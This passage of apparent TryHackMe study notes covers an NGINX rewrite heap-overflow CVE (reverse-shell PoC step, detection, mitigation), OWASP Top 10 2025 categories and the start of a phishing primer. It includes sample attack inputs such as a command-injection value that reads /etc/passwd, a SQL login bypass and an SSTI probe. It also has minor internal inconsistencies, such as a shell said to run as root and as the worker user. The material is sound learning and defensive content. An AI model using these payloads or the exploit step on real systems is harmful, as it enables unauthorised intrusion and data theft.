**Step 3 — Run PoC reverse-shell mode:**

```bash
python3 poc.py --shell
```

Driver spawns netcat listener on TCP `1337`, runs brute-force loop. On successful trigger, listener catches inbound connection, drop into interactive `/bin/sh` running as NGINX worker user inside container.

From the prompt:

```bash
id                   # Confirms root inside container
cat /flag.txt        # Flag in THM{...} format
```

**Caution:** worker process is subject to master's lifecycle; long-running commands can be terminated when next exploit attempt corrupts a sibling worker. Keep sessions short.

#### Detection and Mitigation

**Two layers of defence:**

1. **Upstream patch** — restores propagation of `is_args` into sub-engine
2. **Configuration-level workaround** — sidesteps trigger pattern

**Patching:**

- NGINX Open Source: **1.30.1** and **1.31.0** contain the fix
- NGINX Plus: fix in **R32 P6** and **R36 P4**
- F5 has published patched versions of NGINX App Protect WAF/DoS, NGINX Gateway Fabric, NGINX Ingress Controller, and F5 WAF/DoS products — see vendor advisory `K000160932`
- Distributions shipping patched packages on usual channels

Check installed version:

- **Debian:** `nginx -v` and `apt-cache policy nginx`
- **Red Hat:** `nginx -v` and `dnf info installed nginx`

**Configuration Workaround:**

Replace every **unnamed PCRE capture** in an affected `rewrite` directive with a **named capture**. The bug is reachable only through the unnamed-capture code path; named captures use a different evaluation function not affected by the `is_args` state mismatch.

Mitigate the trigger configuration by changing unnamed `(.*)` to named capture `(?<path>.*)` and updating `set` to reference `$path`:

```nginx
location ~ ^/api/(?<path>.*)$ {
    rewrite ^/api/(?<path>.*)$ /internal?migrated=true;
    set $original_endpoint $path;
}
```

Behaviour is preserved; trigger is removed. **Treat as temporary measure**, not permanent fix (sensitive to future codebase changes).

**Detection:**

The same property making the bug exploitable makes it **visible**. Successful exploit produces:

- **Burst of long, plus-padded URIs** to the same vulnerable `location`
- **Sequence of worker restarts**

Either signal alone is suspicious; the combination is unambiguous.

**Access logs:** grep for unusually long URIs with high run-lengths of plus signs:

```bash
grep -E '\+{30,}' /var/log/nginx/access.log
```

(30+ consecutive `+` is well above benign client behaviour)

**Error logs:** worker restarts recorded when master log level is `notice` or higher — look for spike in `worker process N exited on signal 11` within short window.

**Connection state:** PoC leaves distinctive pattern of half-open and immediate-closed connections; `ss -t` snapshot shows many connections in `CLOSE_WAIT` and `LAST_ACK` states.

**WAF rules:** block URIs with long runs of escapable characters, but care needed to avoid blocking benign clients legitimately passing escapable characters in path components. Safer signature: specific combination of URI matching known rewrite pattern + payload above length threshold + high proportion of plus signs.

#### Operational Lessons

**Three key points stand out:**

1. **Configuration matters as much as version** — patched NGINX with vulnerable rewrite pattern still defines attack surface; unpatched NGINX with no rewrite directives has no exposure. Version inventory alone insufficient for CVE-2026-42945 triage; configuration review against trigger pattern (unnamed PCRE capture + `?` in replacement + subsequent directive) required to scope risk accurately.
    
2. **Worker respawn architectures are double-edged** — same property making NGINX robust in the face of crashes is what makes the bug forgiving to exploit. Architectural choices made for availability often create useful behaviours for attackers; assumption that a crash is the worst outcome can hide existence of underlying corruption primitive.
    
3. **Long-lived code with no recent security activity ≠ proven code** — the `is_args` flag has been in NGINX codebase since **2008**, surviving eighteen years of code review, integration testing, and production deployment. An automated whole-repository analysis surfaced it on a six-hour scan once the right analysis was pointed at it. Periodic re-audit of stable code is as important as catching new bugs in fresh changes.
    

> [!summary] Quick Recap — CVE-2026-42945: Nginx Rift
> 
> - **Root cause:** `is_args` flag state mismatch between two passes of NGINX script engine — length pass uses zeroed sub-engine (`is_args=0`), copy pass uses main engine (`is_args=1`)
> - **Trigger:** `rewrite` with `?` in replacement (sets `is_args=1`) + `set` with unnamed capture `$1` (routes through sub-engine path)
> - **Overflow mechanism:** URI escaping differs between passes — length pass counts raw bytes, copy pass counts escaped bytes (each escapable char = 3 bytes); for N escapable chars, copy writes `raw_size + 2*N` bytes into `raw_size`-byte buffer
> - **Attack surface:** plus signs (`+`) and other URI-escapable chars in captured substring; overflow into adjacent heap pool
> - **Exploitation:** cross-request heap feng shui — partial HTTP headers + adjacent pool placement + rewrite overflow → cleanup pointer corruption + spray fake `ngx_pool_cleanup_t` structures → brute-force low-byte overwrites until landing on sprayed pointer
> - **Requirements:** ASLR disabled for RCE (but DoS works with ASLR enabled); overflow bytes must be URI-safe, so binary payloads sprayed via POST bodies (raw bytes, no escaping)
> - **Two-stage convergence:** deterministic heap layout across worker restarts + respawning workers + thousands of sprayed candidates = quick brute-force convergence
> - **Mitigation:** patch to NGINX 1.30.1+ or 1.31.0+ (or NGINX Plus R32P6/R36P4) _or_ replace unnamed captures with named captures (`(?<name>.*)` instead of `(.*)`)
> - **Detection:** grep access logs for 30+ consecutive `+` chars; correlate with worker restart spikes in error logs; look for half-open/CLOSE_WAIT connections during attack
> - **Operational pattern:** configuration review required for triage (not just version inventory); worker respawn intended for availability but enables exploit iteration; long-lived code needs periodic re-audit
## 11. OWASP Top 10 2025
### OWASP Top 10 2025: IAAA Failures

> [!info] Section overview
> Three categories related to failures in Identity, Authentication, Authorization, and Accountability (IAAA) implementation:
> - A01: Broken Access Control
> - A07: Authentication Failures
> - A09: Logging & Alerting Failures

#### Intro

This room breaks down **3 OWASP Top 10 2025** categories related to failures in how **Identity, Authentication, Authorisation, and Accountability (IAAA)** is implemented in applications. These are foundational security controls; weaknesses here allow threat actors to access other users' data or gain unintended privileges.

The room is designed for beginners and assumes no prior security knowledge. For deeper dives, reference the [IAAA & IDM room](https://tryhackme.com/room/iaaaidm).

#### What is IAAA?

**IAAA** is a framework for thinking about how users and their actions are verified on applications. Each item is crucial, and **it isn't possible to skip a level** — if a previous item fails, later steps cannot be performed reliably.

- **Identity** — the unique account (e.g., user ID/email) representing a person or service.
- **Authentication** — proving that identity (passwords, OTP, passkeys).
- **Authorisation** — what that identity is allowed to do.
- **Accountability** — recording and alerting on who did what, when, and from where.

The three OWASP Top 10:2025 categories in this room relate to **failures** in how IAAA was implemented. Weaknesses enable threat actors to either access other users' data or gain more privileges than intended.

#### A01: Broken Access Control

**Broken Access Control** happens when the server doesn't properly **enforce who can access what on every request**. A common manifestation is **IDOR** (Insecure Direct Object Reference) — changing an ID (e.g. `?id=7 → ?id=6`) lets you see or edit someone else's data.

In practice, this appears as:
- **Horizontal privilege escalation** — same role, accessing other users' data
- **Vertical privilege escalation** — jumping to admin-only actions

The application **trusts the client too much**, assuming if a user sends a request, they have permission to perform it. Without explicit checks tying the user to the data they're requesting, this becomes trivial to exploit.

**Practical: User Account Discovery**

Navigate to a static site with user accounts identified by `accountID` in the URL. By changing the `accountID` parameter, attempt to:
- View other users' data
- Identify which user has **more than $1 million** in their account
- Retrieve any notes or sensitive information from that account

**Type of privilege escalation:** If you can access another user's data *without* gaining additional roles or elevated privileges, this is a **horizontal privilege escalation** (same role, different user's data).

**Deeper dives:** [Broken Access Control room](https://tryhackme.com/room/owaspbrokenaccesscontrol) and [IDOR room](https://tryhackme.com/room/idor) cover encoded IDs, hashed IDs, and other variations.

#### A07: Authentication Failures

**Authentication Failures** happen when an application can't reliably **verify or bind a user's identity**. Common issues include:

- **Username enumeration** — the application reveals which usernames exist (e.g. different error messages for "user not found" vs "wrong password")
- **Weak/guessable passwords** — no lockout or rate limiting, allowing brute-force
- **Logic flaws in login/registration** — case-sensitivity exploits, email validation bypasses, account takeover via recovery flows
- **Insecure session or cookie handling** — predictable tokens, session fixation, JWT weaknesses

If any of these are present, an attacker can often **log in as someone else** or **bind a session to the wrong account**.

**Practical: Username Enumeration & Case Sensitivity**

The application has an `admin` user account. Attempt to:
1. **Register a new account** with a username that matches the admin username but differs in case (e.g. `aDmiN` instead of `admin`)
2. **Log into this case-variant account** — the application fails to distinguish between case variants
3. **Access the admin account's dashboard** to retrieve the flag

This exploits both username enumeration (knowing the `admin` account exists) and a **logic flaw in the login/registration** flow (case-insensitive username handling allowing account takeover).

**Deeper dives:** [Authentication Bypass room](https://tryhackme.com/room/authenticationbypass), [Multi-Factor Authentication room](https://tryhackme.com/room/multifactorauthentications), and the [Authentication Module](https://tryhackme.com/module/authentication) cover brute-force, session handling, cookies, JWT, OAuth, and MFA specifics.

#### A09: Logging & Alerting Failures

**Logging & Alerting Failures** happen when applications don't **record or alert on security-relevant events**. Without proper logging, defenders can't detect or investigate attacks, breaking **accountability** (the ability to prove who did what, when, and from where).

Common failures include:
- **Missing authentication events** — no log of login attempts or successes
- **Vague error logs** — insufficient detail to reconstruct what happened
- **No alerting on brute-force** — no detection when someone tries many passwords
- **No alerting on privilege changes** — unauthorized role escalations go unnoticed
- **Short retention** — logs deleted before investigations can complete
- **Logs stored where attackers can tamper with them** — no immutability or access control

Good logging underpins accountability and enables forensic analysis after an incident.

**Practical: Incident Investigation**

Access a static site showing application logs after an attack. Your investigation should answer:

1. **IP of the attacker** — identify the source making brute-force or exploit attempts
2. **Username of the compromised account** — which account was successfully accessed
3. **Action taken by attacker** — what endpoint or operation was accessed after compromise

This exercise demonstrates how **missing or vague log information makes investigations much harder**. Think about how difficult it would be to understand what happened if key pieces of log data were absent.

**Deeper dive:** [Logging for Accountability room](https://tryhackme.com/room/loggingforaccountability) covers comprehensive logging strategies.

> [!summary] Quick Recap — OWASP Top 10 2025: IAAA Failures
> - **IAAA** = **Identity** (unique account) → **Authentication** (prove identity) → **Authorisation** (permission check) → **Accountability** (logging/alerting); each level depends on the previous one
> - **A01: Broken Access Control** — server doesn't enforce who can access what; IDOR (changing ID to access other users' data) is the classic form; horizontal (same role, different user) vs. vertical (higher privileges) escalation
> - **A07: Authentication Failures** — can't reliably verify or bind identity; username enumeration, weak passwords, login/registration logic flaws, insecure session/cookie handling all enable account takeover
> - **A09: Logging & Alerting Failures** — missing/vague logs prevent detection and investigation; must record authentication events, privilege changes, brute-force attempts, and suspicious actions with sufficient detail for forensics
> - **Practical patterns**: IDOR via URL parameter tampering; case-sensitivity in account matching leading to takeover; log analysis to trace attacker IP, compromised account, and actions taken
> - **Root cause across all three:** application trusts the client (IDOR), trusts incomplete identity verification (auth), or skips security event recording (logging) — all violations of proper IAAA implementation
### OWASP Top 10 2025: Application Design Flaws

> [!info] Section overview Four categories related to failures in architecture and system design:
> 
> - AS02: Security Misconfigurations
> - AS03: Software Supply Chain Failures
> - AS04: Cryptographic Failures
> - AS06: Insecure Design

#### Intro

This room breaks down **4 OWASP Top 10 2025** categories related to failures in **architecture and system design**. These are not code bugs but rather mistakes in how systems are built, deployed, or composed from third-party components.

Practicals require either the TryHackMe AttackBox or your own machine on the TryHackMe VPN to access the lab machines.

#### AS02: Security Misconfigurations

**What It Is**

Security misconfigurations happen when **systems, servers, or applications are deployed with unsafe defaults, incomplete settings, or exposed services**. These are not code bugs but **mistakes in how the environment, software, or network is set up**. They create easy entry points for attackers.

**Why It Matters**

Even small misconfigurations can expose sensitive data, enable privilege escalation, or give attackers a foothold. Modern applications rely on complex stacks, cloud services, and third-party APIs. A single exposed admin panel, open storage bucket, or misconfigured permissions can compromise the entire system.

**Example — 2017 Uber Breach**

Uber exposed a backup AWS S3 bucket with sensitive user data (driver and rider information) because the bucket was **publicly accessible**. Attackers could download data directly without needing credentials — a pure deployment mistake leading to a significant breach.

**Common Patterns**

- **Default credentials or weak passwords** left unchanged (e.g. admin/admin)
- **Unnecessary services or endpoints** exposed to the internet
- **Misconfigured cloud storage or permissions** (S3, Azure Blob, GCP buckets)
- **Unrestricted API access** or missing authentication/authorisation
- **Verbose error messages** exposing stack traces or system details
- **Outdated software, frameworks, or containers** with known vulnerabilities
- **Exposed AI/ML endpoints** without proper access controls

**How To Prevent It**

- Harden default configurations and remove unused features or services
- Enforce strong authentication and **least privilege** across all systems
- Limit network exposure and **segment sensitive resources**
- Keep software, frameworks, and containers up to date with patches
- **Hide stack traces and system information** from error messages (e.g. don't expose `/admin`, `/api/v1/users` in responses)
- **Audit cloud configurations and permissions regularly**
- Secure AI endpoints and automation services with proper access controls and monitoring
- Integrate configuration reviews and automated security checks into deployment pipeline

**Practical: User Management API Traces**

Navigate to `MACHINE_IP:5002`. The developers left too many traces in their User Management APIs. Your goal is to:

- Explore exposed endpoints and configuration information
- Identify verbose error messages or system details
- Retrieve the flag

#### AS03: Software Supply Chain Failures

**What It Is**

Software supply chain failures happen when **applications rely on components, libraries, services, or models that are compromised, outdated, or improperly verified**. These weaknesses are not inherent in your code but in the software and tools you depend on. Attackers exploit these weak links to inject malicious code, bypass security, or steal sensitive data.

**Why It Matters**

Modern applications are built from many **third-party packages, APIs, and AI models**. One compromised dependency can compromise your entire system, allowing attackers to gain access without touching your own code. Supply chain attacks can be automated and distributed, making them hard to detect and very damaging.

**Example — 2021 SolarWinds Orion Compromise**

Attackers inserted **malicious code into a trusted update**, affecting thousands of organisations that automatically installed it. This wasn't a bug in SolarWinds' core logic — it was a flaw in the **software update building, verification, and distribution process**. Attackers gained access to government agencies and Fortune 500 companies through this single compromised update.

**AI-Specific Risks**

With AI, supply chain failures occur when using **unverified third-party models or fine-tuned datasets** that can embed:

- Hidden behaviours or backdoors
- Biased outputs
- Data leakage pathways

**Common Patterns**

- Using **unverified or unmaintained** libraries and dependencies
- **Automatically installing updates** without verification
- **Over-reliance on third-party AI models** without monitoring or auditing
- **Insecure build pipelines or CI/CD processes** that allow tampering
- **Poor license or provenance tracking** for components
- **Lack of monitoring** for vulnerabilities in dependencies after deployment

**How To Protect The Supply Chain**

- **Verify all third-party components, libraries, and AI models** before use
- **Monitor and patch dependencies regularly** (automated scanning tools: Snyk, Dependabot)
- **Sign, verify, and audit** software updates and packages
- **Lock down CI/CD pipelines** and build processes to prevent tampering
- **Track provenance and licensing** for all dependencies
- **Implement runtime monitoring** for unusual behaviour from dependencies or AI components
- **Integrate supply chain threat modelling** into the SDLC (testing, deployment, update workflows)

**Practical: Vulnerable Dependency Exploitation**

Navigate to `MACHINE_IP:5003`. The code is outdated and imports an old `lib/vulnerable_utils.py` component. Your goal is to:

- Identify the vulnerable dependency
- Debug or exploit it to retrieve the flag

#### AS04: Cryptographic Failures

**What It Is**

Cryptographic failures happen when **encryption is used incorrectly or not at all**. This includes:

- **Weak algorithms** (MD5, SHA-1, ECB mode, DES)
- **Hard-coded keys** in code or configuration files
- **Poor key handling** or rotation
- **Unencrypted sensitive data** at rest or in transit

These flaws let attackers access information that should be private.

**Why It Matters**

Web applications rely on cryptography everywhere:

- Protecting network traffic (HTTPS/TLS)
- Securing stored data (passwords, tokens, personal information)
- Verifying identities
- Safeguarding secrets (API keys, database credentials)

When these controls fail, attackers can access passwords, tokens, or personal information, leading to account takeovers or full-scale breaches. They can exploit flaws through **man-in-the-middle attacks, brute-force attacks on weak keys, or by simply discovering secrets that were never properly protected**.

**Common Patterns**

- Using **deprecated or weak algorithms** like MD5, SHA-1, or ECB mode
- **Hard-coded secrets** in code or configuration files (version control, Docker images, etc.)
- **Poor key rotation** or management practices
- **Lack of encryption** for sensitive data at rest or in transit
- **Self-signed or invalid TLS certificates**
- Using **AI/ML systems without proper secret handling** for model parameters or sensitive inputs

**How To Prevent It**

- **Use strong, modern algorithms**: AES-GCM, ChaCha20-Poly1305, or enforce TLS 1.3 with valid certificates
- **Use secure key management services**: Azure Key Vault, AWS KMS, or HashiCorp Vault (never hard-code secrets)
- **Rotate secrets and keys regularly** following defined crypto periods
- **Document and enforce policies** for key lifecycle management
- **Maintain a complete inventory** of certificates, keys, and their owners
- Ensure **AI models and automation agents never expose unencrypted secrets** or sensitive data
- Use **bcrypt, scrypt, or Argon2** for password hashing (never MD5 or SHA-1)

**Practical: Weak Derivation Key Exploitation**

Navigate to `MACHINE_IP:5004`. The application uses a weak, shared derivative key to protect notes. Your goal is to:

- Identify the weak key derivation
- Decrypt the encrypted notes
- Retrieve the flag

#### AS06: Insecure Design

**What It Is**

**Insecure design** happens when **flawed logic or architecture is built into a system from the start**. These flaws stem from:

- Skipped threat modelling
- Missing design requirements or reviews
- Accidental errors in core workflows

With **AI assistants**, insecure design is exacerbated. Developers often assume that models are safe, correct, or predictable, or that AI-generated code is flaw-free. When an AI system can generate queries, write code, or classify users **without limits**, the risk is built into the design, leading to poor architectural patterns.

**Example — Clubhouse Early Design Flaw**

Clubhouse's early design assumed users would only interact through the mobile app, but the **backend API had no proper authentication**. Anyone could query user data, room info, and even private conversations directly. When researchers tested it, the entire "private conversation" premise fell apart — a pure design flaw, not a code bug.

**Why It Matters**

**You can't patch an insecure design.** It's built into the workflow, logic, and trust boundaries. Fixing it means **rethinking how systems (and now AI) make decisions**.

**Common Insecure Designs In 2025**

- **Weak business logic controls** in recovery or approval flows
- **Flawed assumptions** about user or model behaviour
- **AI components with unchecked authority or access**
- **Missing guardrails** for LLMs and automation agents
- **Test or debug bypasses** left in production
- **No consistent abuse-case review** or AI threat modelling

**Insecure Design In The AI Era**

AI introduces new design failure classes:

- **Prompt injection** — user input blended with system prompts, allowing attackers to hijack context or extract hidden data
- **Blind trust in model output** — fragile systems acting on AI decisions without validation; human review remains necessary
- **Poisoned models** — pulled from unverified sources or fine-tuned on unsafe data; embed hidden behaviours or backdoors

**How To Design Securely**

- **Treat every model as untrusted** until proven otherwise
- **Validate and filter all model inputs and outputs** to ensure accuracy and integrity
- **Separate system prompts from user content**
- **Keep sensitive data out of prompts** unless absolutely necessary, protect with strict controls
- **Require human review** for high-risk AI actions
- **Log model provenance, monitor behaviour**, apply differential privacy for sensitive data
- **Include AI-specific threat modelling** (prompt attacks, inference risks, agent misuse, supply chain compromise) throughout design
- **Build threat modelling into every stage** of development, not just at the start
- **Define clear security requirements** for each feature before implementation
- **Apply principle of least privilege** across users, APIs, and services
- **Ensure proper authentication, authorisation, and session management** across the system
- **Keep dependencies, third-party components, and supply chain sources** verified and up to date
- **Continuously monitor and test** the system for logic flaws, abuse paths, and emergent risks

**Practical: Mobile-Only Assumption Bypass**

Navigate to `MACHINE_IP:5005`. The developers assumed only mobile devices can access this endpoint. Your goal is to:

- Bypass the mobile-only restriction (e.g. via User-Agent manipulation or API direct access)
- Retrieve the flag

> [!summary] Quick Recap — OWASP Top 10 2025: Application Design Flaws
> 
> - **AS02: Security Misconfigurations** — deployment mistakes (exposed S3 buckets, default credentials, verbose errors, open APIs) rather than code bugs; prevention = hardening defaults, least privilege, hiding error details, regular audits
> - **AS03: Supply Chain Failures** — compromised/outdated/unverified dependencies (libraries, AI models, build tools); one bad component compromises everything; prevention = verify all third-party sources, sign updates, lock down CI/CD, monitor for emerging vulns
> - **AS04: Cryptographic Failures** — weak algorithms (MD5/SHA-1), hard-coded keys, poor key rotation, unencrypted data; prevention = AES-GCM/TLS1.3, key vaults, bcrypt/Argon2 for passwords, no secrets in code
> - **AS06: Insecure Design** — flawed logic/architecture from the start (Clubhouse: no API auth), unchecked AI authority, prompt injection risks, poisoned models; prevention = threat modelling at every stage, treat models as untrusted, validate AI input/output, human review for high-risk actions, least privilege everywhere
> - **Practical patterns**: configuration exposure, vulnerable dependencies, weak key derivation, design assumptions (mobile-only) that can be bypassed
> - **AI-era considerations:** models need validation and guardrails, LLM prompt injection risks, supply chain risks from unverified models, design should separate system prompts from user input
### OWASP Top 10 2025: Insecure Data Handling

> [!info] Section overview Three categories related to application behaviour and user input:
> 
> - A04: Cryptographic Failures (revisited)
> - A05: Injection
> - A08: Software or Data Integrity Failures

#### Intro

This room introduces **3 OWASP Top 10 2025** elements relating to **application behaviour and user input**. These vulnerabilities affect how applications handle sensitive data and process user-supplied information — core attack surfaces in modern applications.

#### A04: Cryptographic Failures (Revisited)

**What Are Cryptographic Failures?**

Cryptographic failures happen when **sensitive data isn't adequately protected due to lack of encryption, faulty implementation, or insufficient security measures**. This includes:

- **Storing passwords without hashing**
- Using **outdated or weak algorithms** (MD5, SHA-1, DES)
- **Exposing encryption keys**
- Failing to **secure data during transmission**

An incredible example of cryptographic failure is an application "rolling their own cryptography" — creating custom encryption algorithms instead of using well-established, vetted, verifiably secure standard algorithms.

**How to Prevent Cryptographic Failures**

Preventing cryptographic failures starts with choosing **strong, modern algorithms and implementing them properly**:

- **For passwords:** Use robust, slow hashing functions like **bcrypt, scrypt, or Argon2** (never MD5 or SHA-1; never use fast algorithms like SHA-256 alone)
- **For encryption:** Avoid creating your own algorithms; rely on **trusted, industry-standard libraries** (OpenSSL, libsodium)
- **For secrets:** Never embed access credentials (API keys, database passwords, etc.) in source code, configuration files, or repositories. Use **secure key management systems** (AWS KMS, Azure Key Vault, HashiCorp Vault)
- **For transport:** Enforce **TLS 1.3** with valid certificates on all network communication
- **For storage:** Ensure sensitive data is encrypted at rest using modern algorithms

**Practical: Weak Shared Derivative Key Exploitation**

Navigate to `http://MACHINE_IP:8001/`. The web application is a "note sharing" service that uses a **weak, shared derivative key** to protect the notes. Your goal is to:

1. Follow the steps on the web application
2. Identify the weak key derivation mechanism
3. Decrypt the encrypted notes
4. Retrieve the flag from one of the decrypted notes

**Deeper dives:** [Cryptographic Failures Module](https://tryhackme.com/module/cryptofailures) on TryHackMe covers this attack in comprehensive depth.

#### A05: Injection

**What is Injection?**

**Injection** occurs when an application **takes user input and mishandles it**. Instead of processing the input securely, the application passes it directly into a system that can **execute commands or queries**, such as:

- A database (SQL Injection)
- A shell (Command Injection)
- A templating engine (Server-Side Template Injection — SSTI)
- An API endpoint
- An AI model (Prompt Injection)

This happens when the web application **fails to sanitise user input** and instead uses it to construct queries or commands. For example, taking the "username" input on a login form and directly using it to query the database without parameterisation.

**Classic Examples**

- **SQL Injection** — `username' OR '1'='1` in a login form to bypass authentication
- **Command Injection** — `; cat /etc/passwd` appended to a shell command parameter
- **Server-Side Template Injection (SSTI)** — `{{ 7 * 7 }}` in a template field to execute arbitrary expressions
- **Prompt Injection** — hijacking an LLM's instructions by embedding new commands in user input

**Why Injection Remains Dangerous**

Even in **2025**, injection attacks remain relevant and high-severity — injection appears on the OWASP Top 10 not just once in 2021, but **twice by 2025** (once for traditional injection, once for AI-specific variants). This reflects the persistent nature of the vulnerability class and its continued exploitation in the wild.

**How to Prevent Injection**

Preventing injection starts with treating **user input as always untrusted**:

- **For SQL queries:** Use **prepared statements and parameterised queries** instead of building queries through string concatenation
    
    ```python
    # WRONG: vulnerable to SQL injection
    query = f"SELECT * FROM users WHERE username = '{username}'"
    
    # RIGHT: parameterised query
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    ```
    
- **For OS commands:** Avoid functions that pass input directly to the system shell (e.g. `os.system()`, `shell=True` in subprocess). Use **safe APIs and processes that don't invoke the shell at all**
    
    ```python
    # WRONG: vulnerable to command injection
    os.system(f"ping {host}")
    
    # RIGHT: use subprocess without shell=True
    subprocess.run(["ping", "-c", "1", host])
    ```
    
- **For templates:** Separate **system prompts from user input**; never embed user input directly into template expressions. Use safe templating engines with auto-escaping
    
- **Input validation and sanitisation** play crucial roles:
    
    - **Escape dangerous characters** (e.g. quotes, semicolons, template syntax)
    - **Enforce strict data types** (e.g. expect an integer, reject strings)
    - **Filter before processing** — validate input at the earliest stage
    - **Allowlist known-good patterns** rather than blocklist dangerous ones

**Practical: Server-Side Template Injection (SSTI)**

Navigate to `http://MACHINE_IP:8000/`. This practical showcases **command injection** through SSTI. You will abuse the application's ability to render dynamic content to retrieve a flag:

1. Identify where user input is rendered as a template
2. Craft an SSTI payload to execute arbitrary template expressions
3. Read the contents of **`flag.txt`** located in the same directory as the web application
4. Retrieve the flag

**Deeper dives:** [Injection Attacks Module](https://tryhackme.com/module/injection-attacks) and [Command Injection room](https://tryhackme.com/room/oscommandinjection) on TryHackMe cover this attack class comprehensively.

#### A08: Software or Data Integrity Failures

**What Are Software or Data Integrity Failures?**

**Software or Data Integrity Failures** occur when an application **relies on code, updates, or data it assumes are safe, without verifying their authenticity, integrity, or origin**. This includes:

- **Trusting software updates without verification** (e.g. auto-installing updates from the internet)
- **Loading scripts or configuration files from untrusted sources**
- **Failing to validate data** that impacts application logic
- **Accepting data such as binaries, templates, or JSON files** without confirming they haven't been altered
- **Deserializing untrusted data** (pickle in Python, serialized objects in Java, etc.)

The assumption is that code, data, and updates are legitimate and can be automatically trusted — **this is a fatal flaw.**

**How to Avoid Software & Data Integrity Failures**

Preventing these failures begins with **establishing trust boundaries**. Applications should **never assume** that code, updates, or key pieces of data are legitimate. Instead:

- **Verify integrity** using cryptographic checks (checksums, digital signatures) for update packages
- **Ensure only trusted sources** can modify critical artefacts
- **Use cryptographic verification** (SHA-256, HMAC, digital signatures) before accepting any update or critical data
- **Avoid deserialization** of untrusted data; if necessary, use JSON instead of binary formats (pickle, serialized objects) whenever possible
- **Sign all code and binaries** with cryptographic signatures; verify signatures before execution
- **Build integrity verification into CI/CD pipelines** — no artifact should be deployed without cryptographic proof it came from the correct source and hasn't been tampered with

**Within CI/CD and Build Processes**

- **Lock down the build pipeline** to prevent tampering (e.g. require code review before merging, sign all commits)
- **Verify dependencies** during the build; pin exact versions rather than using floating ranges
- **Use code signing** for all release artifacts
- **Implement binary attestation** — prove that built artifacts came from your trusted build process

**Practical: Python Pickle Deserialization Attack**

Navigate to `http://MACHINE_IP:8002/`. This practical demonstrates a **deserialization attack in Python**. Python's `pickle` module can deserialize arbitrary Python objects, and if those objects contain embedded code, that code executes automatically during deserialization.

Your goal is to:

1. **Generate a malicious, serialised payload** using Python's `pickle` module
2. Craft the payload to read the contents of **`flag.txt`** when deserialized
3. **Submit the payload** to the web application
4. Retrieve the flag from the response

**Example approach:**

```python
import pickle
import os

# Create a malicious object that runs a command when unpickled
# This typically involves crafting a pickle with __reduce__ or similar hooks
# that execute arbitrary code during deserialization

# Serialize and submit to the application
```

**Deeper dives:** [Insecure Deserialisation room](https://tryhackme.com/room/insecuredeserialisation) and [Supply Chain Attack: Lottie room](https://tryhackme.com/room/supplychainattacks) on TryHackMe cover deserialization and data integrity attacks comprehensively.

> [!summary] Quick Recap — OWASP Top 10 2025: Insecure Data Handling
> 
> - **A04: Cryptographic Failures** (revisited) — weak/missing encryption, hard-coded keys, unencrypted data at rest/transit, weak password hashing; prevention = AES-GCM, bcrypt/Argon2, key vaults, TLS 1.3, never roll-your-own crypto
> - **A05: Injection** — user input passed unsanitised into commands/queries/templates (SQL, OS command, SSTI, prompt injection); prevention = parameterised queries, safe APIs without shell invocation, separate system prompts from user input, validate/sanitise early
> - **A08: Software or Data Integrity Failures** — trusting untrusted code, updates, or data without verification; includes deserialization of malicious objects; prevention = cryptographic verification of all updates/artifacts, avoid deserialization of untrusted data, sign code/binaries, lock down CI/CD pipelines
> - **Practical patterns**: weak key derivation exploitation, SSTI to read files, pickle deserialization to execute arbitrary code
> - **Common theme:** **trust boundaries are broken** — application assumes data/code/input is safe when it isn't; always verify, validate, and sanitise at the earliest point
> - **Modern risks**: AI/LLM prompt injection, supply chain attacks on dependencies, CI/CD pipeline tampering all fall under these failure classes
## 12. Password Attacks
### Phishing Basics

> [!info] Section overview Phishing is one of the most powerful tools in a penetration tester's arsenal. Despite rock-solid firewalls and intrusion detection systems, phishing exploits the human element — the one vulnerability no amount of technology can fully secure. A single well-crafted email can bypass technical controls, plant malware, or steal credentials.

#### Intro

Imagine being tasked with breaching a company's defences during a pentesting engagement. Their firewalls are rock-solid, and their intrusion detection systems are impenetrable. But there's one vulnerability that no technology can fully secure: **the human element.**

**Phishing** is often the easiest way to gain initial access during an engagement. Why? Because even the most secure organisations rely on people, and people can be tricked, manipulated, and persuaded into giving up access. A single well-crafted email can bypass technical controls, plant malware, or steal credentials that unlock the door to the target's network.

**Learning objectives:**

- What phishing is and its role in a pentest
- The psychology behind phishing
- Common phishing attacks
- The anatomy of a phishing campaign
- Phishing tools

#### Phishing 101

**What Is Phishing?**

**Phishing** is a form of cyber attack that uses **social engineering** to trick people into revealing sensitive information or running malware on their devices. Attackers deceive victims by impersonating legitimate sources via:

- Emails
- Text messages (SMS — "smishing")
- Voice calls ("vishing")
- Fake websites designed to look legitimate

Phishing exploits **human psychology rather than technical vulnerabilities**. Attackers craft believable narratives and apply pressure tactics to manipulate victims into compromising their security. Through phishing, attackers aim for:

- Financial gain
- Unauthorised access to sensitive data
- Installation of malware on a victim's device

**Types of Phishing**

**Phishing (Broad Cast)**

Phishing is the scam's broad, "cast a wide net" version. Attackers send the same believable message to **many people at once**, often using common themes like account alerts or invoices. These messages feel routine rather than personal; any details are generic or slightly off. The aim is **quick wins at scale**: stolen passwords, card details, or a foothold on a device.

**Spear Phishing**

Spear phishing is a **targeted attack tailored to a specific person**. The goal is usually to get the target to:

- Click a link
- Open a file
- Run a task
- Submit credentials

This allows the attacker to **move deeper into the organisation's network**.

**Whaling**

Whaling is **spear phishing that targets senior decision-makers and executives** (CEOs, CFOs, CFRs). Both spear phishing and whaling are targeted and customised attacks; the distinction is who is targeted and what leverage is expected:

- **Spear phishing** can hit anyone whose access enables a foothold (IT, finance, HR, project teams)
- **Whaling** concentrates on people whose decision-making power can move money, expose regulated data, or override controls

**Phishing in Penetration Testing**

Phishing is essential in evaluating an organisation's vulnerability to social engineering attacks. By simulating these attacks, pentesters can:

- Uncover human weaknesses within an organisation
- Assess risks associated with successful phishing (data breaches, malware infections)
- Gauge organisational exposure and prepare defences against real threats

Ethical hackers design **mock emails** that closely resemble real threats during phishing penetration tests **without causing any harm**. They may target specific groups based on their roles within the organisation. Tools track response metrics such as **open and click-through rates**, providing valuable insights into employee behaviour. Incorporating phishing into penetration testing reveals an organisation's susceptibility to social engineering and strengthens its cyber security posture over time.

#### Psychology of Phishing

Phishing campaigns use **social engineering techniques** to manipulate emotions and influence decision-making. These tactics often exploit vulnerabilities in human psychology to increase the likelihood of success.

**Social Engineering Principles**

**Scarcity**

Scarcity makes something feel **rare**, which pushes people to act before they think. Psychologically, **FOMO** (fear of missing out) and **loss aversion** kick in: we dislike losing a chance more than we like gaining a benefit. Language often includes "limited seats," "last chance," or "ends today."

_Example:_ "Only three TryPhones up for grabs."

**Urgency**

